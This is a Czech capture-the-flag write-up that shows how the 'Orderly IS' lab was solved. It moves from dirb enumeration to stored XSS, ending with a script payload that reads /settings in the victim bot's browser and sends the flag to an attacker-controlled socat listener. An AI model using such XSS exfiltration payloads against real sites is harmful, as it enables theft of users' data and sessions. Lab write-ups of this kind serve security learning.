# Orderly IS

## Zadání

```
Hi, packet inspector,

do you want to order something? Use our Orderly information system, it is intuitive, fast, reliable and secure! At least that's what we claim in the TV ad. In last few hours it began to act weirdly, but its administrator is on vacation away from civilization (and connectivity).

You will have to break into the Orderly information system and check its configuration.

May the Packet be with you!
```

## Řešení

### 1. Enumerace

```
dirb http://orderly.mysterious-delivery.tcc:23000/
```

```
---- Scanning URL: http://10.99.0.131:23000/ ----
==> DIRECTORY: http://10.99.0.131:23000/javascript/                            
+ http://10.99.0.131:23000/login (CODE:200|SIZE:1846)                          
+ http://10.99.0.131:23000/logout (CODE:302|SIZE:199)                          
+ http://10.99.0.131:23000/server-status (CODE:403|SIZE:279)                   
+ http://10.99.0.131:23000/settings (CODE:302|SIZE:199)
```

* Stránka obsahuje skrytý endpoint `/settings`, kde je ovšem vyžadováno heslo.
* Dále je nastavena cookie `session` při přístupu na `/add`, je ovšem HttpOnly (viz dále)

### 2. `/order/add`

Zde můžeme zadat vstup, který je následně zobrazen. Vstup není sanitován -> XSS, například toto zobrazí dialogové okno "1":

```html
<script>alert(1)</script>
```

Pustíme ve vpn socat: `socat - TCP-LISTEN:5000,fork,reuseaddr` a ověříme že někdo stránku opravdu navštěvuje

```html
<img src="http://10.200.0.11:5000/">
```

Výstup obsahuje jednak náš přístup z Chrome, ale i cizí přístup z Firefoxu:

```
GET / HTTP/1.1
Host: 10.200.0.11:5000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://10.99.0.131:23000/
Accept-Encoding: gzip, deflate
Accept-Language: cs,en;q=0.9,sk;q=0.8

GET / HTTP/1.1
Host: 10.200.0.11:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.99.0.131:23000/
Connection: keep-alive
```

### 3. Extrakce vlajky

Cookie bohužel nelze poslat pomocí javascript, protože nastavení cookie je HttpOnly:

```
Set-Cookie: session=eyJjc3JmX3Rva2VuIjoiMzUwYmEzOTIxMzhmNDdlYzRiNWVmMmI2ZjQ5ZDk2MjU4ZjVkMmE5OSJ9.Y1-3rA.4U_WCstHvtoQSr6MTx8S9_GR0z4; HttpOnly; Path=/
```

Můžeme ale využít endpoint `/settings`, který pravděpodobně bude obsahovat vlajku a přihlášený uživatel k ní bude mí přístup. Je vhodné omezit počet znaků v HTTP requestu a tak ve stránce najdeme "FLAG" a výsledek si pošleme do socat:

```html
<script>
function httpGet(url)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", url, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
var out = httpGet('/settings');
var index = out.indexOf("FLAG");
httpGet('http://10.200.0.11:5000/?data='+out.substr(index, index + 30));
</script>
```

Výstup:

```
GET /?data=FLAG{9QVE-0miw-qnwm-ER9m}%3C/span%3E%20%20%20%20%20%20%20%20%3C/div%3E%3Cscript%20src=%22/static/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=%22/static/bootstrap.min.js%22%3E%3C/script%3E%3C/body%3E%3C/html%3E HTTP/1.1
Host: 10.200.0.11:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.99.0.131:23000/
Origin: http://10.99.0.131:23000
Connection: keep-alive
```

## Vlajka

```
FLAG{9QVE-0miw-qnwm-ER9m}
```
